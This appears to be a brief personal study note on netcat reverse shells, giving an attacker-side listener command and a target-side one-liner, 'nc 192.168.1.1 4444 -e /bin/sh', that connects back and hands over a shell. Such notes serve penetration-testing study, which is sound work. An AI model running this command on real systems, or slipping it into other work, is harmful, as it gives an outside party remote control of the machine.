## **Netcat Reverse Shells** - a victim connect to the attacker

![[Pasted image 20240613164237.png]]


- All we do is to listen via

```
nc -lvp 4444
```

- The target connect to us and establish a shell

```
nc 192.168.1.1 4444 -e /bin/sh
```
